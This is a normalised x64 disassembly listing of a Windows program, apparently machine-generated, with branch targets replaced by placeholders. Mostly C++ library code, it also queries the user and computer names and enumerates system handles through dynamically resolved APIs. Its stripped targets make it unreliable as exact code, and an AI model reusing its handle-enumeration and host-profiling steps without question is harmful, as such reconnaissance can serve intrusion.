jne r-xdata
mov rcx [ rbx - 0x40 ]
call j_sub_14003ad04
cmp [ rbx ] 0x8
jb r-xdata
mov rsi [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
sub_14000f220
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov [ rsp + 0x50 ] rsi
mov rbx rdx
mov rdi rcx
mov [ rcx + 0x18 ] 0x7
xor esi esi
mov [ rcx + 0x10 ] rsi
mov [ rcx ] si
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140001dd0
nop
lea rcx [ rdi + 0x28 ]
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] rsi
mov [ rcx ] si
lea rdx [ rbx + 0x28 ]
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140001dd0
mov eax [ rbx + 0x50 ]
mov [ rdi + 0x50 ] eax
mov eax [ rbx + 0x54 ]
mov [ rdi + 0x54 ] eax
mov eax [ rbx + 0x58 ]
mov [ rdi + 0x58 ] eax
mov eax [ rbx + 0x5c ]
mov [ rdi + 0x5c ] eax
mov eax [ rbx + 0x60 ]
mov [ rdi + 0x60 ] eax
mov eax [ rbx + 0x64 ]
mov [ rdi + 0x64 ] eax
mov eax [ rbx + 0x68 ]
mov [ rdi + 0x68 ] eax
mov eax [ rbx + 0x6c ]
mov [ rdi + 0x6c ] eax
mov eax [ rbx + 0x70 ]
mov [ rdi + 0x70 ] eax
mov rax rdi
mov rbx [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
sub_14000f2d0
mov [ rsp + 0x18 ] r8
push rbx
push rsi
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rbx r8
mov rsi rdx
mov rdi rcx
mov [ rsp + 0x50 ] rbx
mov rax rbx
add rsp 0x30
pop rdi
pop rsi
pop rbx
retn
mov [ rsp + 0x58 ] rbx
test rbx rbx
je r-xdata
add rbx 0x78
mov [ rsp + 0x60 ] rbx
add rdi 0x78
jmp r-xdata
mov rdx rdi
mov rcx rbx
call sub_14000f220
nop
cmp rdi rsi
je r-xdata
sub_14000f330
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
cmp [ rcx + 0x40 ] 0x8
mov rbx rcx
jb r-xdata
xor edi edi
mov [ rbx + 0x40 ] 0x7
mov [ rbx + 0x38 ] rdi
mov [ rbx + 0x28 ] di
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rcx [ rcx + 0x28 ]
call j_sub_14003ad04
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rdi
mov [ rbx ] di
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rbx ]
call j_sub_14003ad04
sub_14000f390
mov [ rsp + 0x8 ] rcx
push rbp
push rsi
push rdi
push r12
push r13
lea rbp [ rsp - 0x70 ]
sub rsp 0x170
mov [ rsp + 0x40 ] 0xfffffffffffffffe
mov [ rsp + 0x1b0 ] rbx
mov edi r8d
mov rbx rcx
xor r13d r13d
mov [ rbp + 0xa8 ] r13d
test dl dl
je r-xdata
lea rax [ r--data ]
mov [ rsp + 0x50 ] rax
lea rax [ r--data ]
mov [ rsp + 0x60 ] rax
lea rax [ r--data ]
mov [ rbp - 0x18 ] rax
mov [ rbp + 0xa8 ] 0x2
lea rdx [ rsp + 0x68 ]
lea rcx [ rsp + 0x50 ]
call sub_140004740
nop
mov rax [ rsp + 0x50 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rsp + rcx + 0x50 ] rax
lea rcx [ rsp + 0x68 ]
call sub_140004aa0
nop
lea rax [ r--data ]
mov [ rsp + 0x68 ] rax
mov [ rbp - 0x28 ] r13
mov [ rbp - 0x20 ] r13d
mov [ rbp + 0xb8 ] r13
mov edx 0x8
lea rcx [ rbp + 0x50 ]
call sub_140039e70
mov r12 rax
lea rdx [ r--data ]
lea rcx [ rsp + 0x60 ]
call sub_14000ac10
mov rsi rax
test rax rax
jne r-xdata
call [ GetLastError@IAT ]
mov edi eax
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx rsi
mov rcx r13
jmp r-xdata
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx r11
mov rcx r13
jmp r-xdata
mov rdx [ r12 + 0x8 ]
call [ r12 ]
mov r11 [ rsi ]
movsxd rax [ r11 + 0x4 ]
mov ecx 0x30
mov [ rax + rsi + 0x58 ] cx
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
add rcx rsi
and [ rcx + 0x18 ] 0xfffff9ff
or [ rcx + 0x18 ] 0x800
mov edx edi
mov rcx rsi
call sub_140008400
mov r11 rax
test rax rax
jne r-xdata
mov edx 0x20
lea rcx [ rsp + 0x60 ]
call sub_14000fe50
mov rcx rax
mov rdx [ rbp + 0xb8 ]
call sub_14000ac10
mov rcx [ rbp + 0xb8 ]
call [ LocalFree@IAT ]
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
mov rdx rax
mov [ rsp + 0x30 ] r13
mov [ rsp + 0x28 ] r13d
lea rax [ rbp + 0xb8 ]
mov [ rsp + 0x20 ] rax
mov r9d 0x400
mov r8d edi
mov ecx 0x19ff
call [ FormatMessageW@IAT ]
test eax eax
setne al
test al al
jne r-xdata
and [ rcx + 0x18 ] 0xfffff3ff
or [ rcx + 0x18 ] 0x200
mov edx 0x29
mov rcx r11
call sub_14000fe50
mov [ rsp + 0x30 ] r13
mov [ rsp + 0x28 ] r13d
lea rax [ rbp + 0xb8 ]
mov [ rsp + 0x20 ] rax
mov r9d 0x400
mov r8d edi
xor edx edx
mov ecx 0x11ff
call [ FormatMessageW@IAT ]
test eax eax
setne al
test al al
jne r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x60 ]
call sub_14000ac10
jmp r-xdata
mov rdx rbx
lea rcx [ rsp + 0x50 ]
call sub_140003da0
mov [ rbp + 0xa8 ] 0x3
lea rcx [ rbp - 0x18 ]
call sub_140003cd0
lea r11 [ r--data ]
mov [ rbp - 0x18 ] r11
lea rcx [ rbp - 0x18 ]
call sub_140037d08
mov rax rbx
mov rbx [ rsp + 0x1b0 ]
add rsp 0x170
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
sub_14000f600
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x20
mov rdi rdx
mov rsi rcx
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
xor al al
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
mov ecx [ rdi ]
mov [ rsp + 0x30 ] rbx
mov eax 0x2
mov [ rsp + 0x38 ] rbp
mov [ rsp + 0x40 ] r12
mov r12 0xffffffffffffffff
mul rcx
cmovo rax r12
mov rcx rax
call j_sub_14003ac60
lea ecx [ r12 + 0x3 ]
mov r8 rdi
mov rdx rax
mov rbx rax
call [ GetUserNameExW@IAT ]
test al al
setne bpl
test bpl bpl
je r-xdata
mov rcx rbx
call j_sub_14003ad04#2
mov r12 [ rsp + 0x40 ]
mov rbx [ rsp + 0x30 ]
movzx eax bpl
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
xor eax eax
mov rcx r12
mov rdi rbx
[ rdi ]
mov rdx rbx
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx rsi
call sub_140001ea0
sub_14000f6c0
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x20
mov rdi rdx
mov rsi rcx
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
xor al al
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
mov ecx [ rdi ]
mov [ rsp + 0x30 ] rbx
mov eax 0x2
mov [ rsp + 0x38 ] rbp
mov [ rsp + 0x40 ] r12
mov r12 0xffffffffffffffff
mul rcx
cmovo rax r12
mov rcx rax
call j_sub_14003ac60
lea ecx [ r12 + 0x8 ]
mov r8 rdi
mov rdx rax
mov rbx rax
call [ GetComputerNameExW@IAT ]
test eax eax
setne bpl
test bpl bpl
je r-xdata
mov rcx rbx
call j_sub_14003ad04#2
mov r12 [ rsp + 0x40 ]
mov rbx [ rsp + 0x30 ]
movzx eax bpl
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
xor eax eax
mov rcx r12
mov rdi rbx
[ rdi ]
mov rdx rbx
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx rsi
call sub_140001ea0
sub_14000f780
push rbp
push rsi
push rdi
push r12
push r13
sub rsp 0x270
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x2b0 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x260 ] rax
mov r13 rdx
mov rbx rcx
cmp [ rcx + 0x18 ] 0x8
jb r-xdata
call [ PathIsRelativeW@IAT ]
test eax eax
je r-xdata
mov rcx [ rcx ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rsp + 0x40 ] 0x7
xor eax eax
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x28 ] ax
xor sil sil
xor edx edx
xor ecx ecx
call [ GetCurrentDirectoryW@IAT ]
mov edi eax
mov eax 0x2
mul rdi
mov r12 0xffffffffffffffff
cmovo rax r12
mov rcx rax
call j_sub_14003ac60
mov rbp rax
test edi edi
je r-xdata
mov rdx rbx
lea rcx [ rsp + 0x50 ]
call [ PathCanonicalizeW@IAT ]
test eax eax
setne bl
test bl bl
je r-xdata
mov rbx [ rbx ]
mov rcx rbp
call j_sub_14003ad04
test sil sil
je r-xdata
mov rdx rax
mov ecx edi
call [ GetCurrentDirectoryW@IAT ]
lea ecx [ rdi - 0x1 ]
cmp eax ecx
jne r-xdata
movzx eax bl
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rsp + 0x50 ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rsp + 0x50 ]
mov rcx r13
call sub_140001ea0
cmp [ rsp + 0x40 ] 0x8
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
xor eax eax
mov rcx r12
mov rdi rbp
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx rbp
lea rcx [ rsp + 0x28 ]
call sub_140001ea0
mov sil 0x1
movzx eax sil
jmp r-xdata
mov rcx [ rsp + 0x28 ]
call j_sub_14003ad04
lea rdx [ rsp + 0x28 ]
cmp [ rsp + 0x40 ] 0x8
cmovae rdx [ rsp + 0x28 ]
mov r8 rbx
lea rcx [ rsp + 0x50 ]
call [ PathCombineW@IAT ]
xor eax eax
mov rcx r12
lea rdi [ rsp + 0x50 ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rsp + 0x50 ]
mov rcx r13
call sub_140001ea0
nop
mov rbx [ rbx ]
mov rcx [ rsp + 0x260 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x2b0 ]
add rsp 0x270
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
sub_14000f930
push rbp
push rdi
push r13
sub rsp 0x20
mov r13 rcx
lea rcx [ r--data ]
mov rbp rdx
call [ GetModuleHandleW@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
mov rdi rax
test rax rax
je r-xdata
add rsp 0x20
pop r13
pop rdi
pop rbp
retn
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x58 ] r12
mov r12d 0x10000
mov ecx r12d
call j_sub_14003ac60
xor ebx ebx
lea r9 [ rsp + 0x50 ]
lea ecx [ rbx + 0x10 ]
mov r8d r12d
mov rdx rax
mov rsi rax
mov [ rsp + 0x50 ] ebx
call rdi
cmp eax 0xc0000004
jne r-xdata
test eax eax
sete r12b
test r12b r12b
je r-xdata
mov rcx rsi
call j_sub_14003ad04#2
add r12d r12d
mov ecx r12d
call j_sub_14003ac60
lea r9 [ rsp + 0x50 ]
mov r8d r12d
mov rdx rax
mov ecx 0x10
mov rsi rax
call rdi
cmp eax 0xc0000004
je r-xdata
mov rcx rsi
call j_sub_14003ad04#2
mov rsi [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
movzx eax r12b
mov r12 [ rsp + 0x58 ]
add rsp 0x20
pop r13
pop rdi
pop rbp
retn
cmp [ rsi ] ebx
jbe r-xdata
lea rdi [ rsi + 0x8 ]
lea rcx [ rbx + rbx * 2 ]
mov eax ebx
lea rdx [ rsi + rcx * 8 + 0x8 ]
mov rcx r13
call sub_14000fb50
mov eax [ rdi ]
cmp [ rbp ] eax
jne r-xdata
test rbp rbp
je r-xdata
inc ebx
add rdi 0x18
cmp ebx [ rsi ]
jb r-xdata
sub_14000fa40
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
mov rsi rcx
lea rcx [ r--data ]
mov rdi rdx
mov [ rsp + 0x58 ] 0x0
call [ GetModuleHandleW@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
mov rbx rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
xor al al
add rsp 0x30
pop rdi
retn
xor r9d r9d
lea rax [ rsp + 0x50 ]
xor r8d r8d
lea edx [ r9 + 0x2 ]
mov rcx rsi
mov [ rsp + 0x50 ] 0x0
mov [ rsp + 0x20 ] rax
call rbx
cmp eax 0xc0000004
jne r-xdata
mov ecx [ rsp + 0x50 ]
call j_sub_14003ac60
mov r9d [ rsp + 0x50 ]
lea rcx [ rsp + 0x50 ]
mov [ rsp + 0x20 ] rcx
mov r8 rax
mov edx 0x2
mov rcx rsi
mov [ rsp + 0x58 ] rax
call rbx
test eax eax
setns bl
test bl bl
jne r-xdata
mov rdx [ rsp + 0x58 ]
mov rcx rdi
movzx r8d [ rdx ]
mov rdx [ rdx + 0x8 ]
shr r8 0x1
call sub_140001ea0
mov rcx [ rsp + 0x58 ]
call j_sub_14003ad04#2
movzx eax bl
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
lea rcx [ rsp + 0x58 ]
call j_sub_14003ad04#2
movzx eax bl
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
sub_14000fb50
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x8 ]
mov rdi rdx
cmp rdx rcx
jae r-xdata
cmp rcx [ rbx + 0x10 ]
jne r-xdata
mov rax [ rbx ]
cmp rax rdx
ja r-xdata
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
mov rcx rbx
call sub_14000fc10
sub rdi rax
mov rax 0x2aaaaaaaaaaaaaab
imul rdi
mov rdi rdx
sar rdi 0x2
mov rax rdi
shr rax 0x3f
add rdi rax
cmp rcx [ rbx + 0x10 ]
jne r-xdata
add [ rbx + 0x8 ] 0x18
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ rdi ]
mov [ rcx ] rax
mov rax [ rdi + 0x8 ]
mov [ rcx + 0x8 ] rax
mov rax [ rdi + 0x10 ]
mov rcx [ rbx + 0x8 ]
mov r8 [ rbx ]
lea rdx [ rdi + rdi * 2 ]
test rcx rcx
je r-xdata
mov rcx rbx
call sub_14000fc10
mov rax [ r8 + rdx * 8 ]
mov [ rcx ] rax
mov rax [ r8 + rdx * 8 + 0x8 ]
mov [ rcx + 0x8 ] rax
mov rax [ r8 + rdx * 8 + 0x10 ]
jmp r-xdata
mov [ rcx + 0x10 ] rax
sub_14000fc10
sub rsp 0x28
mov r10 [ rcx ]
mov rdx [ rcx + 0x8 ]
mov r11 0x2aaaaaaaaaaaaaab
sub rdx r10
mov rax r11
mov r9 rcx
imul rdx
mov r8 rdx
sar r8 0x2
mov rax r8
shr rax 0x3f
add r8 rax
mov rax 0xaaaaaaaaaaaaaa9
cmp r8 rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
mov rax r11
inc r8
sub rcx r10
imul rcx
sar rdx 0x2
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r8 rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
add rsp 0x28
retn
mov rcx rdx
mov rax 0xaaaaaaaaaaaaaaa
shr rcx 0x1
sub rax rcx
cmp rax rdx
jae r-xdata
add rdx rcx
mov rcx r9
cmp rdx r8
cmovb rdx r8
call sub_14000fcd0
xor edx edx
mov rcx r9
cmp rdx r8
cmovb rdx r8
add rsp 0x28
jmp sub_14000fcd0
sub_14000fcd0
push r12
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x68 ] rdi
mov rdi rdx
mov rsi rcx
mov rax 0xaaaaaaaaaaaaaaa
cmp rdx rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
sub rcx [ rsi ]
mov r12 0x2aaaaaaaaaaaaaab
mov rax r12
imul rcx
sar rdx 0x2
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx rdi
jae r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
xor ebx ebx
mov [ rsp + 0x58 ] rbx
test rdi rdi
je r-xdata
mov r8 rbx
mov rdx [ rsi + 0x8 ]
mov rcx [ rsi ]
call sub_1400100c0
nop
mov rcx [ rsi ]
mov rdx [ rsi + 0x8 ]
sub rdx rcx
mov rax r12
imul rdx
mov r12 rdx
sar r12 0x2
mov rax r12
shr rax 0x3f
add r12 rax
test rcx rcx
je r-xdata
lea rcx [ rdi + rdi * 2 ]
shl rcx 0x3
call sub_14003ac60
mov rbx rax
mov [ rsp + 0x58 ] rax
test rax rax
jne r-xdata
lea rax [ rdi + rdi * 2 ]
lea rcx [ rbx + rax * 8 ]
mov [ rsi + 0x10 ] rcx
lea rax [ r12 + r12 * 2 ]
lea rcx [ rbx + rax * 8 ]
mov [ rsi + 0x8 ] rcx
mov [ rsi ] rbx
call j_sub_14003ad04
mov [ rsp + 0x58 ] rax
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x28 ]
call sub_14003a774
lea r11 [ r--data ]
mov [ rsp + 0x28 ] r11
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003f22c
nop
sub_14000fe10
push rbx
sub rsp 0x20
mov r8 rdx
mov rbx rcx
test rcx rcx
jne r-xdata
mov rax [ rcx ]
mov rdx [ rdx + 0x8 ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
call [ r8 ]
mov rax rbx
add rsp 0x20
pop rbx
retn
mov rdx [ rdx + 0x8 ]
call [ r8 ]
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_14000fe50
mov rax rsp
mov [ rax + 0x8 ] rcx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x20 ] rsi
movzx r14d dx
mov rdi rcx
xor ebx ebx
mov [ rsp + 0x80 ] ebx
mov r15 rcx
mov [ rax - 0x40 ] rcx
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
mov rcx [ r8 + rcx + 0x48 ]
test rcx rcx
je r-xdata
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rdi + 0x10 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rdi + 0x10 ] 0x0
sete al
mov [ rsp + 0x30 ] al
test al al
je r-xdata
mov rcx [ rcx + rdi + 0x50 ]
test rcx rcx
je r-xdata
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
mov [ rcx + rdi + 0x28 ] 0x0
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
test ebx ebx
je r-xdata
mov rsi [ rcx + rdi + 0x28 ]
cmp rsi 0x1
jg r-xdata
call sub_1400103c0
call j_sub_14004042c
test al al
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
dec rsi
xor esi esi
jmp r-xdata
mov rax [ r15 ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + r15 + 0x48 ]
test rcx rcx
je r-xdata
mov rcx r15
call sub_1400112c0
nop
xor r8d r8d
call sub_140003120
nop
or edx 0x4
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rdi + 0x48 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
mov eax [ rcx + rdi + 0x18 ]
and eax 0x1c0
mov r12d 0x4
mov r13d 0xffff
cmp eax 0x40
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x78 ]
mov rsi [ rsp + 0x88 ]
add rsp 0x40
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
mov rax [ rcx ]
movzx edx r14w
call [ rax + 0x18 ]
movzx r14d ax
mov rax [ rcx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
jmp r-xdata
test rsi rsi
jle r-xdata
test rsi rsi
jle r-xdata
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r14w
jmp r-xdata
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
movzx r8d [ rcx + rdi + 0x58 ]
mov rcx [ rcx + rdi + 0x48 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
movzx r8d [ rcx + rdi + 0x58 ]
mov rcx [ rcx + rdi + 0x48 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
cmp r13w r14w
cmove ebx r12d
mov rax [ rcx ]
movzx edx r8w
call [ rax + 0x18 ]
movzx r8d ax
mov rax [ rcx + 0x60 ]
cmp [ rax ] ebx
jle r-xdata
mov rax [ rcx ]
movzx edx r8w
call [ rax + 0x18 ]
movzx r8d ax
mov rax [ rcx + 0x60 ]
cmp [ rax ] ebx
jle r-xdata
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r8w
jmp r-xdata
mov [ rsp + 0x80 ] ebx
test ebx ebx
jne r-xdata
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r8w
jmp r-xdata
cmp r13w r8w
cmove ebx r12d
mov [ rsp + 0x80 ] ebx
dec rsi
jmp r-xdata
cmp r13w r8w
cmove ebx r12d
dec rsi
jmp r-xdata
sub_1400100c0
sub rsp 0x38
mov [ rsp + 0x20 ] 0xfffffffffffffffe
nop [ rax ] eax
mov rax r8
add rsp 0x38
retn
test r8 r8
je r-xdata
add r8 0x18
add rcx 0x18
jmp r-xdata
mov rax [ rcx ]
mov [ r8 ] rax
mov rax [ rcx + 0x8 ]
mov [ r8 + 0x8 ] rax
mov rax [ rcx + 0x10 ]
mov [ r8 + 0x10 ] rax
cmp rcx rdx
je r-xdata
sub_140010110
mov rax rsp
push rsi
push rdi
push r12
sub rsp 0x90
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov rbp rdx
mov rsi rcx
xor r12d r12d
mov edi r12d
mov [ rsp + 0xb0 ] r12d
cmp [ rcx ] rdi
jne r-xdata
mov eax 0x2
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x28 ]
mov rbp [ r11 + 0x30 ]
mov rsp r11
pop r12
pop rdi
pop rsi
retn
lea ecx [ r12 + 0x28 ]
call sub_14003ac60
mov rbx rax
mov [ rsp + 0xb0 ] rax
test rax rax
je r-xdata
mov rbx r12
mov rax [ rbp ]
mov rdx [ rax + 0x28 ]
test rdx rdx
jne r-xdata
lea rcx [ rsp + 0x40 ]
call sub_140037f70
nop
mov rcx [ rsp + 0x78 ]
test rcx rcx
je r-xdata
lea rcx [ rsp + 0x40 ]
call sub_140002990
mov edi 0x1
mov [ rbx + 0x8 ] r12
lea rax [ r--data ]
mov [ rbx ] rax
lea rcx [ rsp + 0x28 ]
call sub_1400388c0
mov rcx [ rax ]
mov [ rbx + 0x10 ] rcx
mov rcx [ rax + 0x8 ]
mov [ rbx + 0x18 ] rcx
mov rax [ rax + 0x10 ]
mov [ rbx + 0x20 ] rax
jmp r-xdata
lea rdx [ rax + 0x30 ]
mov [ rsp + 0x78 ] r12
mov rcx [ rsp + 0x68 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov [ rsi ] rbx
test dil 0x1
je r-xdata
mov [ rsp + 0x68 ] r12
mov rcx [ rsp + 0x58 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov [ rsp + 0x58 ] r12
mov rcx [ rsp + 0x48 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov [ rsp + 0x48 ] r12
lea rcx [ rsp + 0x40 ]
call sub_14003828c
call sub_14003ad04
sub_140010260
mov [ rsp + 0x10 ] rbx
push rsi
sub rsp 0x20
mov rsi r8
mov rbx rdx
cmp rdx r8
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rsi
retn
mov [ rsp + 0x30 ] rdi
lea rdi [ rcx + 0x10 ]
nop
movzx ecx [ rbx ]
mov rdx rdi
call sub_140038790
inc rbx
mov [ rbx - 0x1 ] al
cmp rbx rsi
jne r-xdata
mov rdi [ rsp + 0x30 ]
sub_1400102c0
mov [ rsp + 0x10 ] rbx
push rsi
sub rsp 0x20
mov rsi r8
mov rbx rdx
cmp rdx r8
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rsi
retn
mov [ rsp + 0x30 ] rdi
lea rdi [ rcx + 0x10 ]
nop
movzx ecx [ rbx ]
mov rdx rdi
call sub_140039e84
inc rbx
mov [ rbx - 0x1 ] al
cmp rbx rsi
jne r-xdata
mov rdi [ rsp + 0x30 ]
sub_140010360
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov edi edx
mov rbx rcx
mov [ rcx ] rax
mov eax [ rcx + 0x20 ]
test eax eax
jle r-xdata
jns r-xdata
mov rcx [ rcx + 0x18 ]
call sub_14003ad04
jmp r-xdata
lea rax [ r--data ]
mov [ rbx ] rax
test dil 0x1
je r-xdata
mov rcx [ rcx + 0x18 ]
call j_sub_14003ad04#2
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call j_sub_14003ad04
sub_1400103c0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rax [ rcx ]
mov rbx rcx
xor edi edi
movsxd rcx [ rax + 0x4 ]
test [ rcx + rbx + 0x10 ] 0x6
jne r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
test edi edi
je r-xdata
mov rcx [ rcx + rbx + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
mov ecx 0x4
cmp eax 0xffffffff
cmove edi ecx
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
xor r8d r8d
call sub_140003120
or edx 0x4
sub_140010430
mov [ rsp + 0x8 ] rcx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x70
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov [ rsp + 0xa8 ] rbx
mov r14d edx
mov rbx rcx
xor edi edi
mov [ rsp + 0xb0 ] edi
mov [ rsp + 0x50 ] rcx
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
mov rcx [ r8 + rcx + 0x48 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rbx + 0x10 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rcx [ rbx ]
movsxd rax [ rcx + 0x4 ]
cmp [ rax + rbx + 0x10 ] 0x0
sete al
mov [ rsp + 0x58 ] al
test al al
je r-xdata
mov rcx [ rcx + rbx + 0x50 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
test edi edi
je r-xdata
movsxd rcx [ rcx + 0x4 ]
add rcx rbx
lea rdx [ rsp + 0x30 ]
call sub_140003240
nop
mov rcx rax
call sub_14000b0c0
mov r13 rax
mov r12 [ rsp + 0x30 ]
test r12 r12
je r-xdata
call sub_1400103c0
call j_sub_14004042c
test al al
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rbx ]
movsxd r9 [ rax + 0x4 ]
add r9 rbx
mov rax [ r9 + 0x48 ]
mov [ rsp + 0x40 ] 0x0
mov [ rsp + 0x48 ] rax
movzx eax [ r9 + 0x58 ]
movaps xmm0 [ rsp + 0x40 ]
